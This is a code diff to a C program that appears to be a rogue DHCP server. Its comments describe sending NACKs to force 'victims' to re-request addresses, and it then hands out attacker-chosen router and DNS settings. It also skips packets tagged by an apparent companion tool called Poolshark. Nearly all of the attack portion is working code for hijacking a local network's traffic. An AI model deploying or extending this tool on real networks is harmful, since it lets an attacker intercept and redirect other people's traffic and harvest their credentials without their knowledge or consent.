@@ -21,8 +21,12 @@
 #define DHCP_OPTION_HOSTNAME        12
 #define DHCP_OPTION_CLIENT_ID       61
 #define DHCP_OPTION_LEASE_TIME      51
+#define DHCP_OPTION_ROUTER          3
+#define DHCP_OPTION_SUBNET_MASK     1
+#define DHCP_OPTION_DNS             6
 #define DHCP_NAK                    6
 #define DHCP_OPTION_END             255
+#define MAGIC_TAG                   4919
 
 typedef struct DHCP
 {
@@ -53,9 +57,9 @@ int get_iface_ip(int sock, const char *interface, uint32_t *ip, char *ipout);
 int calc_base_ip(uint32_t *ip_addr, uint32_t *netmask, uint32_t *base_ip_out, char *ip_str_out);
 int get_iface_netmask(int sock, const char *interface, uint32_t *netmask, char *netmask_out);
 int get_number_of_ips(uint32_t base_ip);
-Packet *create_offer(Packet *client_request);
-Packet *create_nack(Packet *client_request);
 int parse_dhcp_options(Packet *p);
+void add_dhcp_option(uint8_t *options, int *offset, uint8_t code, uint8_t len, const void *data);
+Packet *init_packet(Packet *client_request, uint32_t lease_ip);
 
 
 volatile sig_atomic_t keep_running = 1;
@@ -102,7 +106,7 @@ int main(int argc, char *argv[])
 
     if(!interface)
     {
-        printf("Error: -i <interface is required.\n");
+        printf("Error: -i <interface> is required.\n");
         return 1;
     }
 
@@ -172,13 +176,17 @@ int main(int argc, char *argv[])
 
     char buffer[BUFFER_SIZE];
 
+    struct sockaddr_in client;
+    socklen_t len = sizeof(client);
+
+    uint32_t leased_ips[n];
+    int lease_index = 0;
+
     while(keep_running)
     {   
-        struct sockaddr_in client;
-        socklen_t len = sizeof(client);
 
         int bytes_recv = recvfrom(sock, buffer, sizeof(buffer), 0, (struct sockaddr *)&client, &len);
-
+        printf("receieved data\n");
         if(bytes_recv < 0)
         {
             perror("recvfrom");
@@ -192,6 +200,14 @@ int main(int argc, char *argv[])
             continue;
         }
 
+        uint32_t xid;
+        memcpy(&xid, &p->dhcp.transaction_id, 4);
+        xid = ntohl(xid);
+        if((xid >> 16) == MAGIC_TAG)
+        {
+            printf("Received a packet likely from Poolshark, discarding.\n");
+            continue;
+        }
 
         printf("Client (xid: %02x%02x%02x%02x) [%02X:%02X:%02X:%02X:%02X:%02X] requested an IP address.\n",
             p->dhcp.transaction_id[0],
@@ -203,11 +219,10 @@ int main(int argc, char *argv[])
             p->dhcp.client_mac[2], 
             p->dhcp.client_mac[3], 
             p->dhcp.client_mac[4], 
-            p->dhcp.client_mac[5]);
+            p->dhcp.client_mac[5]
+        );
 
-            
-
-        Packet *offer = NULL;
+        Packet *response = NULL;
 
         int msg_type = parse_dhcp_options(p);
         client.sin_addr.s_addr = htonl(INADDR_BROADCAST);
@@ -218,32 +233,83 @@ int main(int argc, char *argv[])
         if(msg_type == 1)
         {
             printf("Message type: DHCPDISCOVER\n");
-            offer = create_offer(p);
-            memcpy(&recent_xid, &offer->dhcp.transaction_id, 4);
+
+            response = init_packet(p, htonl(start_lease));
+            memcpy(&recent_xid, &response->dhcp.transaction_id, 4);
+
+            int offset = 0;
+            uint32_t lease_time = htonl(86400);
+
+            add_dhcp_option(response->dhcp.options, &offset, DHCP_OPTION_MESSAGE_TYPE, 1, (uint8_t[]){2});
+            add_dhcp_option(response->dhcp.options, &offset, DHCP_OPTION_SERVER_ID, 4, &ip);
+            add_dhcp_option(response->dhcp.options, &offset, DHCP_OPTION_SUBNET_MASK, 4, &netmask);
+            add_dhcp_option(response->dhcp.options, &offset, DHCP_OPTION_ROUTER, 4, &gateway_ip.s_addr);
+            add_dhcp_option(response->dhcp.options, &offset, DHCP_OPTION_LEASE_TIME, 4, &lease_time);
+            add_dhcp_option(response->dhcp.options, &offset, DHCP_OPTION_DNS, 4, &nameserver_ip.s_addr);
+            response->dhcp.options[offset++] = DHCP_OPTION_END;
+
         }
         else if(msg_type == 2)
         {
-            if(memcmp(p->dhcp.transaction_id, &recent_xid, sizeof(recent_xid)) != 0)
+
+            if(memcmp(p->dhcp.transaction_id, &recent_xid, sizeof(recent_xid)) != 0 && lease_index == 0)
+            {
+                // Send NACK for any DHCPREQUEST
+                // This will force victims to send a DHCPDISCOVER
+
+                printf("Message type: DHCPREQUEST\n");
+                printf("Sending NACK\n");
+
+                start_lease = start_lease + 1;
+
+                // Init base DHCP struct
+                response = init_packet(p, start_lease);
+
+                // Add DHCP options for a NACK
+                int offset = 0;
+                add_dhcp_option(response->dhcp.options, &offset, DHCP_OPTION_MESSAGE_TYPE, 1, (uint8_t[]){DHCP_NAK});
+                response->dhcp.options[offset++] = DHCP_OPTION_END;
+            }
+            else
             {
                 printf("Message type: DHCPREQUEST\n");
-                offer = create_nack(p);
-                printf("test");
+                printf("Sending ACK\n");
+
+
+                response = init_packet(p, htonl(start_lease));
+
+                int offset = 0;
+                uint32_t lease_time = htonl(86400);
+                add_dhcp_option(response->dhcp.options, &offset, DHCP_OPTION_MESSAGE_TYPE, 1, (uint8_t[]){5});
+                add_dhcp_option(response->dhcp.options, &offset, DHCP_OPTION_LEASE_TIME, 4, &lease_time);
+                add_dhcp_option(response->dhcp.options, &offset, DHCP_OPTION_SUBNET_MASK, 4, &netmask);
+                add_dhcp_option(response->dhcp.options, &offset, DHCP_OPTION_ROUTER, 4, &gateway_ip.s_addr);
+                add_dhcp_option(response->dhcp.options, &offset, DHCP_OPTION_DNS, 4, &nameserver_ip.s_addr);
+                response->dhcp.options[offset++] = DHCP_OPTION_END;
             }
-
-        }
-        else
-        {
-            return 1;
         }
 
-        int sent_bytes = sendto(sock, offer, sizeof(*offer), 0, (struct sockaddr *)&client, len);
+        int sent_bytes = sendto(sock, response, sizeof(*response), 0, (struct sockaddr *)&client, len);
 
         if(sent_bytes < 0)
         {
             perror("sendto");
+            free(response);
             return 1;
         }
-        printf("Sent offer in %d bytes\n", sent_bytes);
+
+        free(response);
+
+        printf("Sent %d bytes to [%02X:%02X:%02X:%02X:%02X:%02X]\n", 
+            sent_bytes,
+            p->dhcp.client_mac[0],
+            p->dhcp.client_mac[1],
+            p->dhcp.client_mac[2],
+            p->dhcp.client_mac[3],
+            p->dhcp.client_mac[4],
+            p->dhcp.client_mac[5]
+
+        );
 
     }
     return 0;
@@ -254,7 +320,7 @@ int get_iface_ip(int sock, const char *interface, uint32_t *ip, char *ipout)
     struct ifreq ifr;
     memset(&ifr, 0, sizeof(ifr));
 
-    memcpy(ifr.ifr_name, interface, sizeof(interface));
+    strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
 
     if(ioctl(sock, SIOCGIFADDR, &ifr) < 0)
     {
@@ -284,7 +350,7 @@ int get_iface_netmask(int sock, const char *interface, uint32_t *netmask, char *
     struct ifreq ifr;
     memset(&ifr, 0, sizeof(ifr));
 
-    memcpy(ifr.ifr_name, interface, sizeof(interface));
+    strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
 
     if(ioctl(sock, SIOCGIFNETMASK, &ifr) < 0)
     {
@@ -298,7 +364,6 @@ int get_iface_netmask(int sock, const char *interface, uint32_t *netmask, char *
 
     return 0;
 }
-
 
 int get_number_of_ips(uint32_t netmask)
 {
@@ -314,79 +379,6 @@ int get_number_of_ips(uint32_t netmask)
     int n = (1 << (32 - cidr)) - 2;
 
     return n;
-}
-
-Packet *create_offer(Packet *client_request)
-{
-    Packet *p = malloc(sizeof(Packet));
-    memset(p, 0, sizeof(Packet));
-
-    if(!p)
-    {
-        perror("malloc");
-        exit(EXIT_FAILURE);
-    }
-    start_lease = start_lease + 1;
-
-    uint32_t l = htonl(start_lease);
-
-    p->dhcp.opcode = 0x02;
-    p->dhcp.hw_type = 0x01;
-    p->dhcp.hw_len = 0x06;
-    memcpy(p->dhcp.transaction_id, &client_request->dhcp.transaction_id, sizeof(p->dhcp.transaction_id));
-    memcpy(p->dhcp.flags, &client_request->dhcp.flags, sizeof(p->dhcp.flags));
-    memcpy(p->dhcp.ip_addr, &l, sizeof(p->dhcp.ip_addr));
-    memcpy(p->dhcp.client_mac, &client_request->dhcp.client_mac, sizeof(p->dhcp.client_mac));
-    memcpy(&recent_xid, &client_request->dhcp.transaction_id, 4);
-    p->dhcp.magic_cookie[0] = 99;
-    p->dhcp.magic_cookie[1] = 130;
-    p->dhcp.magic_cookie[2] = 83;
-    p->dhcp.magic_cookie[3] = 99;
-
-    int offset = 0;
-
-    // DHCP Offer
-    p->dhcp.options[offset++] = DHCP_OPTION_MESSAGE_TYPE;
-    p->dhcp.options[offset++] = 1;
-    p->dhcp.options[offset++] = 2;
-
-    // Server Identifier
-    p->dhcp.options[offset++] = DHCP_OPTION_SERVER_ID;
-    p->dhcp.options[offset++] = 4;
-    memcpy(&p->dhcp.options[offset], &ip, 4);
-    offset += 4;
-
-    // Subnet mask
-    p->dhcp.options[offset++] = 1;
-    p->dhcp.options[offset++] = 4;
-    memcpy(&p->dhcp.options[offset], &netmask, 4);
-    offset += 4;
-
-    // Router IP
-    struct in_addr router_ip, dns_ip;
-
-    p->dhcp.options[offset++] = 3;
-    p->dhcp.options[offset++] = 4;
-    memcpy(&p->dhcp.options[offset], &gateway_ip.s_addr, 4);
-    offset += 4;
-
-    // Lease Time
-    p->dhcp.options[offset++] = DHCP_OPTION_LEASE_TIME;
-    p->dhcp.options[offset++] = 4;
-    uint32_t lease_time = htonl(86400);
-    memcpy(&p->dhcp.options[offset], &lease_time, 4);
-    offset += 4;
-
-    // DNS
-    p->dhcp.options[offset++] = 6;
-    p->dhcp.options[offset++] = 4;
-    memcpy(&p->dhcp.options[offset], &nameserver_ip.s_addr, 4);
-    offset += 4;
-
-    // End options
-    p->dhcp.options[offset++] = DHCP_OPTION_END;
-
-    return p;
 }
 
 int parse_dhcp_options(Packet *p)
@@ -407,6 +399,12 @@ int parse_dhcp_options(Packet *p)
             return -1;
         }
 
+        if(p->dhcp.options[i] == DHCP_OPTION_REQUESTED_IP)
+        {
+            uint32_t requested_ip = p->dhcp.options[i + 2];
+            return 1;
+        }
+
         if(p->dhcp.options[i] == DHCP_OPTION_MESSAGE_TYPE)
         {
             int msg = p->dhcp.options[i + 2];
@@ -423,38 +421,46 @@ int parse_dhcp_options(Packet *p)
     }
 }
 
-Packet *create_nack(Packet *client_request)
+void add_dhcp_option(uint8_t *options, int *offset, uint8_t code, uint8_t len, const void *data)
 {
- 
-    Packet *p = malloc(sizeof(Packet));
+    options[(*offset)++] = code;
+    options[(*offset)++] = len;
+    if(data && len > 0)
+    {
+        memcpy(&options[*offset], data, len);
+        *offset += len;
+    }
+}
 
+
+Packet *init_packet(Packet *client_request, uint32_t lease_ip)
+{
+    // Allocate the packet in memory
+    Packet *p = malloc(sizeof(Packet));
     if(!p)
     {
         perror("malloc");
         exit(EXIT_FAILURE);
     }
 
+    // Zero out Packet struct
+    memset(p, 0, sizeof(Packet));
+
+    memcpy(p->dhcp.ip_addr, &lease_ip, sizeof(p->dhcp.ip_addr));
+
+    // Build the basic DHCP structure
     p->dhcp.opcode = 0x02;
     p->dhcp.hw_type = 0x01;
     p->dhcp.hw_len = 0x06;
-    
     memcpy(p->dhcp.transaction_id, &client_request->dhcp.transaction_id, sizeof(p->dhcp.transaction_id));
     memcpy(p->dhcp.flags, &client_request->dhcp.flags, sizeof(p->dhcp.flags));
+    memcpy(p->dhcp.ip_addr, &lease_ip, sizeof(p->dhcp.ip_addr));
     memcpy(p->dhcp.client_mac, &client_request->dhcp.client_mac, sizeof(p->dhcp.client_mac));
-
+    memcpy(&recent_xid, &client_request->dhcp.transaction_id, 4);
     p->dhcp.magic_cookie[0] = 99;
     p->dhcp.magic_cookie[1] = 130;
     p->dhcp.magic_cookie[2] = 83;
     p->dhcp.magic_cookie[3] = 99;
-
-    int offset = 0;
-
-    // NACK Response
-    p->dhcp.options[offset++] = DHCP_OPTION_MESSAGE_TYPE;
-    p->dhcp.options[offset++] = 1;
-    p->dhcp.options[offset++] = DHCP_NAK;
-
-    p->dhcp.options[offset++] = DHCP_OPTION_END;
 
     return p;
 }
